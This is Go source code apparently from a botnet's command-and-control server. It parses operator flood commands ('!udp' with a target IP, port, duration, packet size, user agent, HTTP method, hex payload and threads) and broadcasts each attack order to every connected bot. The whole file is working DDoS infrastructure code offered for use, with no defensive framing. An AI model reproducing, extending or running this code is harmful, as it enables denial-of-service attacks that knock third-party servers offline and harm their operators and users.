package attack

import (
	"fmt"
	"server/core/master/session/sessions"
	"server/core/slaves/slave"
	"strconv"
	"strings"
)

var (
	INT    = 0
	STRING = 1
)

type FlagInfo struct {
	flagID          uint8
	flagDescription string
	flagType        int
}

type AttackCommand struct {
	ID       int
	Targets  []string
	Port     int
	Duration int
	Flags    map[int]interface{}
}

var flagInfoLookup = map[string]FlagInfo{
	"len": {
		0,
		"Size of packet data, default is 512 bytes",
		INT,
	},
	"agent": {
		1,
		"UserAgent of the http request, default is random",
		STRING,
	},
	"method": {
		2,
		"Method of the http request, default is GET",
		STRING,
	},
	"payload": {
		3,
		"Payload of the floods in hexadecimal, default is random or none.",
		STRING,
	},
	"threads": {
		4,
		"Payload of the floods in hexadecimal, default is random or none.",
		INT,
	},
}

func uint8InSlice(a uint8, list []uint8) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func Handle(args []string, session *sessions.Session, method *Method) {
	args = args[1:]

	if len(args) == 0 {
		session.Println("This usage is incorrect.")
		session.Println("Example: !udp 1.1.1.1 53 30 size=1440")
		return
	}

	ip := args[0]
	args = args[1:]

	if len(args) == 0 {
		session.Println("The port was not specified.")
		return
	}
	port, err := strconv.Atoi(args[0])
	if err != nil {
		session.Println("The port is not a valid integer.")
		return
	}
	args = args[1:]

	if len(args) == 0 {
		session.Println("The duration was not specified.")
		return
	}
	duration, err := strconv.Atoi(args[0])
	if err != nil {
		session.Println("The duration is not a valid integer.")
		return
	}
	args = args[1:]

	flags := make(map[int]interface{})

	// Parse flags
	for len(args) > 0 {
		flagSplit := strings.SplitN(args[0], "=", 2)
		if len(flagSplit) != 2 {
			session.Println("Invalid key=value combinination.")
			return
		}
		flagInfo, exists := flagInfoLookup[flagSplit[0]]
		if !exists || !uint8InSlice(flagInfo.flagID, method.Flags) {
			session.Println("Invalid flag")
			return
		}
		if flagSplit[1][0] == '"' {
			flagSplit[1] = flagSplit[1][1 : len(flagSplit[1])-1]
			fmt.Println(flagSplit[1])
		}
		if flagSplit[1] == "true" {
			flagSplit[1] = "1"
		} else if flagSplit[1] == "false" {
			flagSplit[1] = "0"
		}

		if flagInfo.flagType == INT {
			atoi, err := strconv.Atoi(flagSplit[1])
			if err != nil {
				session.Println("This flag is an integer.")
				return
			}
			flags[int(flagInfo.flagID)] = atoi
		} else {
			flags[int(flagInfo.flagID)] = flagSplit[1]
		}
		args = args[1:]
	}

	var accepted = 0

	for _, s := range slave.List.Slaves {
		s.Write("1")
		s.Connection.WriteObject(AttackCommand{
			ID:       method.Id,
			Targets:  []string{ip},
			Port:     port,
			Duration: duration,
			Flags:    flags,
		})
		accepted++
	}

	session.Println(fmt.Sprintf("\x1b[0mBroadcasted command to %d/%d clients.", accepted, slave.List.Count()))
}
